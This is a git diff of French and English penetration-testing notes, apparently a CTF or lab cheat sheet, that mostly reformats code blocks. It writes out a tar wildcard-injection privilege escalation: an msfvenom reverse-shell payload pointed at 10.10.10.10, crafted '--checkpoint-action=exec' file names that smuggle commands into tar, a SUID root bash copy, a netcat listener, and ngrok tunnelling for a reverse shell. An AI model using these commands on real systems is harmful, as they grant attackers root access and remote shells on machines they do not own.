@@ -149,24 +149,34 @@ Si les noms des fichiers sont des options de commande correct alors
 on peut executer d'autres fichiers.  
 donc :   
 ***quand on cat le fichier on lit blabla tar '*' :**
+```bash
 $ cat /usr/local/bin/compress.sh
+```
 REVERSE root SHELL
 on créee un payload qu'on envoie avec un serv python ou en copier coller (en php par ex):
+```bash
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
 $ chmod +x /home/user/shell.elf
-on cree des fichiers qui seront eectutés comme des <flag> de la commande tar
+```
+on cree des fichiers qui seront executés comme des <flag> de la commande tar
+```bash
 $ touch /home/user/--checkpoint=1
 $ touch /home/user/--checkpoint-action=exec=shell.elf
+```
 on setup un netcat et on attend
+```
 $ nc -nvlp 4444
+```
 
 #### ROOTBASH
 ```bash
-1. In command prompt type:
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
 2. touch /home/user/--checkpoint=1
 3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+```
+
 4. Wait 1 minute for the Bash script to execute.
+```bash
 5. In command prompt type: /tmp/bash -p
 ```
 
@@ -451,3 +461,18 @@ USE db_name;
 SHOW TABLES;
 DESCRIBE table_name;
 ```
+
+## USE NGROK
+***FORWARD AN HTTP SERVER***
+```bash
+ngrok http <port where the server is running>
+```
+***FORWARD A TCP PORT (REVERSE SHELL)***
+```bash
+nc -lvp <listening port>
+```
+Dans un second terminal
+```bash
+ngrok tcp <same port>
+```
+The IP and port are  now the ngrok.eu.io....:<port>
